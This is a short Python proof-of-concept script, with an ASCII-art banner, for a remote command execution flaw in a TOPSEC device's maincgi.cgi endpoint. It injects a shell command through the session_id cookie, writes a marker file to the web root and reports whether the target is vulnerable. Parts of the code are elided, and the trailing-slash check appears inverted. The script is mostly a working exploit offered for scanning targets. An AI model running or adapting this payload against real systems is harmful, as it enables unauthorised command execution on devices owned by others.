              ...
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            tag: this is a  某r信TOPSEC Cookie 远程命令执行漏洞 poc                                       
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target + "/"
    url = target + "cgi/maincgi.cgi?Url=aa"
    ...
    headers = {
        ...
        "Cookie": "session_id_443=1|echo 'y1k1ng' > /www/htdocs/site/image/y1.txt;",
    ...
    try:
        ...
        if response.status_code == 200 and ("y1k1ng" in response.text):
            print(f"[+] {target} 存在 远程命令执行漏洞 ")
        else:
            print(f"[-] {target} 未发现 远程命令执行漏洞")
